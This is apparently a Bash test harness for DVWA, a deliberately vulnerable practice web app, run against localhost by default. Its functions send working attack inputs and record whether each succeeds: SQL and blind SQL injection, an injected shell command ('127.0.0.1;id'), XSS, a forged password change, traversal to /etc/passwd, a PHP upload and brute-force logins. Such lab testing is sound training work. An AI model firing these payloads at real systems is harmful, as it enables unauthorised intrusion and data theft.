#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${DVWA_BASE_URL:-http://localhost:4280}"
USER="${DVWA_USER:-admin}"
PASS="${DVWA_PASS:-password}"
COOKIE_FILE=".dvwa_cookies.txt"
TOKEN_FILE=".dvwa_token.txt"
RESULTS_FILE="${DVWA_RESULTS_FILE:-dvwa_results.md}"

need_cmd() {
  command -v "$1" >/dev/null 2>&1 || { echo "[FAIL] missing command: $1"; exit 1; }
}

extract_token() {
  # supports token fields using single or double quotes
  sed -nE "s/.*name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"].*/\1/p" | head -n1
}

fetch_page() {
  local path="$1"
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL$path"
}

fetch_token_from_page() {
  local path="$1"
  fetch_page "$path" | extract_token
}

setup_db() {
  need_cmd curl
  need_cmd sed
  need_cmd grep

  local token
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/setup.php" | extract_token)
  if [[ -z "${token:-}" ]]; then
    echo "[FAIL] could not extract setup token"
    exit 1
  fi

  local out
  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/setup.php" \
    --data-urlencode "create_db=Create / Reset Database" \
    --data-urlencode "user_token=$token")

  if grep -qiE "Database has been created|already exists|table.*created" <<<"$out"; then
    echo "[OK] database setup/reset completed"
  else
    echo "[INFO] setup response received (manual review may be needed)"
  fi
}

login() {
  local token
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/login.php" | extract_token)
  if [[ -z "${token:-}" ]]; then
    echo "[FAIL] could not extract login CSRF token"
    exit 1
  fi

  local out
  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/login.php" \
    --data-urlencode "username=$USER" \
    --data-urlencode "password=$PASS" \
    --data-urlencode "Login=Login" \
    --data-urlencode "user_token=$token")

  if grep -qi "login failed" <<<"$out"; then
    echo "[FAIL] login failed"
    exit 1
  fi

  echo "$token" > "$TOKEN_FILE"
  echo "[OK] login session prepared"
}

set_security_low() {
  local token
  token=$(fetch_token_from_page "/security.php")
  if [[ -z "${token:-}" ]]; then
    echo "[FAIL] could not extract security token"
    exit 1
  fi

  local out
  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/security.php" \
    --data-urlencode "security=low" \
    --data-urlencode "seclev_submit=Submit" \
    --data-urlencode "user_token=$token")

  if grep -qi "Security level set to low" <<<"$out"; then
    echo "[OK] security level set to low"
  else
    echo "[WARN] security level confirmation text not found; verify in UI"
  fi
}

record_result() {
  local vuln="$1"; shift
  local status="$1"; shift
  local detail="$*"
  printf "| %s | %s | %s |\n" "$vuln" "$status" "$detail" >> "$RESULTS_FILE"
}

sqli() {
  local body count
  body=$(fetch_page "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27=%271&Submit=Submit")
  count=$(grep -o "First name:" <<<"$body" | wc -l | tr -d ' ')
  if [[ "$count" -gt 1 ]]; then
    echo "[WARN] SQLi classic appears vulnerable (multiple rows returned: $count)"
    record_result "SQL Injection (Classic)" "WARN (vulnerable)" "Returned $count records for tautology payload"
  else
    echo "[OK] SQLi classic did not show multi-row behavior"
    record_result "SQL Injection (Classic)" "OK (mitigated)" "No multi-row response for tautology payload"
  fi
}

sqli_blind() {
  local normal timed t1 t2 dt
  normal=$(date +%s)
  fetch_page "/vulnerabilities/sqli_blind/?id=1&Submit=Submit" >/dev/null
  timed=$(date +%s)
  t1=$((timed-normal))

  normal=$(date +%s)
  fetch_page "/vulnerabilities/sqli_blind/?id=1%27%20AND%20SLEEP(2)%23&Submit=Submit" >/dev/null || true
  timed=$(date +%s)
  t2=$((timed-normal))

  dt=$((t2-t1))
  if [[ "$dt" -ge 2 ]]; then
    echo "[WARN] Blind SQLi timing delta detected (baseline=${t1}s, payload=${t2}s)"
    record_result "Blind SQL Injection" "WARN (vulnerable)" "Timing delta ${dt}s indicates time-based injection"
  else
    echo "[OK] Blind SQLi timing delta not observed (baseline=${t1}s, payload=${t2}s)"
    record_result "Blind SQL Injection" "OK (mitigated/unclear)" "No significant timing delta"
  fi
}

cmdi() {
  local body
  body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" \
    --data-urlencode "ip=127.0.0.1;id" \
    --data-urlencode "Submit=Submit")
  if grep -qiE "uid=|gid=" <<<"$body"; then
    echo "[WARN] Command Injection appears vulnerable (id command output observed)"
    record_result "Command Injection" "WARN (vulnerable)" "Injected command output (uid/gid) observed"
  else
    echo "[OK] Command Injection payload did not execute"
    record_result "Command Injection" "OK (mitigated)" "No injected command output"
  fi
}

xss_r() {
  local body
  body=$(fetch_page "/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E")
  if grep -Fq "<script>alert(1)</script>" <<<"$body"; then
    echo "[WARN] Reflected XSS appears vulnerable (raw script reflected)"
    record_result "Reflected XSS" "WARN (vulnerable)" "Raw script tag reflected in response"
  else
    echo "[OK] Reflected XSS payload appears encoded/blocked"
    record_result "Reflected XSS" "OK (mitigated)" "Script tag not reflected raw"
  fi
}

xss_s() {
  local marker body
  marker="DVWA_XSSS_$(date +%s)"
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/xss_s/" \
    --data-urlencode "txtName=<script>${marker}</script>" \
    --data-urlencode "mtxMessage=stored" \
    --data-urlencode "btnSign=Sign Guestbook" >/dev/null
  body=$(fetch_page "/vulnerabilities/xss_s/")
  if grep -Fq "<script>${marker}</script>" <<<"$body"; then
    echo "[WARN] Stored XSS appears vulnerable (payload persisted)"
    record_result "Stored XSS" "WARN (vulnerable)" "Persisted script marker found in guestbook"
  else
    echo "[OK] Stored XSS payload not persisted as executable script"
    record_result "Stored XSS" "OK (mitigated)" "No raw persisted script marker"
  fi
}

csrf() {
  local body
  body=$(fetch_page "/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change")
  if grep -q "Password Changed" <<<"$body"; then
    echo "[WARN] CSRF appears vulnerable (state change accepted without CSRF token)"
    record_result "CSRF" "WARN (vulnerable)" "Password change accepted via forged-style GET"
  else
    echo "[OK] CSRF-style state change rejected"
    record_result "CSRF" "OK (mitigated)" "Password change not accepted without anti-CSRF proof"
  fi
}

lfi() {
  local body
  body=$(fetch_page "/vulnerabilities/fi/?page=../../../../../../etc/passwd")
  if grep -q "root:x:" <<<"$body"; then
    echo "[WARN] File Inclusion appears vulnerable (passwd content included)"
    record_result "File Inclusion (LFI/RFI)" "WARN (vulnerable)" "Detected passwd marker root:x:"
  else
    echo "[OK] File Inclusion payload blocked"
    record_result "File Inclusion (LFI/RFI)" "OK (mitigated)" "Traversal payload did not include system file"
  fi
}

upload() {
  local tmp body file
  file="dvwa_upload_test_$(date +%s).php"
  tmp=$(mktemp)
  printf '<?php echo "UPLOAD_MARKER"; ?>' > "$tmp"
  body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/upload/" \
    -F "uploaded=@$tmp;filename=$file;type=application/x-php" \
    -F "Upload=Upload")
  rm -f "$tmp"

  if grep -qi "succesfully uploaded" <<<"$body"; then
    echo "[WARN] Unrestricted Upload appears vulnerable (PHP file accepted: $file)"
    record_result "Unrestricted File Upload" "WARN (vulnerable)" "Server accepted PHP upload $file"
  else
    echo "[OK] Upload payload rejected"
    record_result "Unrestricted File Upload" "OK (mitigated)" "PHP upload rejected"
  fi
}

brute() {
  local blocked=0 i out
  for i in 1 2 3 4 5; do
    out=$(fetch_page "/vulnerabilities/brute/?username=admin&password=wrong$i&Login=Login")
    if grep -qiE "too many|locked|rate" <<<"$out"; then
      blocked=1
    fi
  done
  if [[ "$blocked" -eq 1 ]]; then
    echo "[OK] Brute-force protection indicators detected"
    record_result "Brute Force" "OK (mitigated)" "Lockout/rate limiting indicators observed"
  else
    echo "[WARN] Brute-force protection appears weak (no lockout indicators)"
    record_result "Brute Force" "WARN (vulnerable)" "No lockout/rate limiting indicators in 5 rapid attempts"
  fi
}

weak_id() {
  local vals=() i headers v
  for i in 1 2 3 4 5; do
    headers=$(curl -fsSI -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/weak_id/")
    v=$(grep -i '^set-cookie: dvwaSession=' <<<"$headers" | sed -E 's/.*dvwaSession=([^;]+).*/\1/I' | tail -n1)
    [[ -n "${v:-}" ]] && vals+=("$v")
  done

  if [[ "${#vals[@]}" -ge 3 ]]; then
    if [[ "${vals[0]}" =~ ^[0-9]+$ && "${vals[1]}" =~ ^[0-9]+$ ]]; then
      echo "[WARN] Weak Session ID appears vulnerable (predictable numeric sequence: ${vals[*]})"
      record_result "Weak Session ID" "WARN (vulnerable)" "Predictable dvwaSession values: ${vals[*]}"
      return
    fi
  fi

  echo "[OK] Weak Session ID obvious predictability not detected"
  record_result "Weak Session ID" "OK (mitigated/unclear)" "No simple predictable sequence found"
}

init_results() {
  cat > "$RESULTS_FILE" <<'MD'
# DVWA Vulnerability Test Results

| Vulnerability | Status | Evidence |
|---|---|---|
MD
}

full() {
  init_results
  setup_db
  login
  set_security_low

  sqli
  sqli_blind
  cmdi
  xss_r
  xss_s
  csrf
  lfi
  upload
  brute
  weak_id

  echo "[OK] full run complete"
  echo "[INFO] results saved to $RESULTS_FILE"
}

case "${1:-}" in
  setup_db) setup_db ;;
  login) login ;;
  set_security_low) set_security_low ;;
  sqli) sqli ;;
  sqli_blind) sqli_blind ;;
  cmdi) cmdi ;;
  xss_r) xss_r ;;
  xss_s) xss_s ;;
  csrf) csrf ;;
  lfi) lfi ;;
  upload) upload ;;
  brute) brute ;;
  weak_id) weak_id ;;
  full) full ;;
  *)
    echo "Usage: $0 {setup_db|login|set_security_low|sqli|sqli_blind|cmdi|xss_r|xss_s|csrf|lfi|upload|brute|weak_id|full}"
    exit 1
    ;;
esac
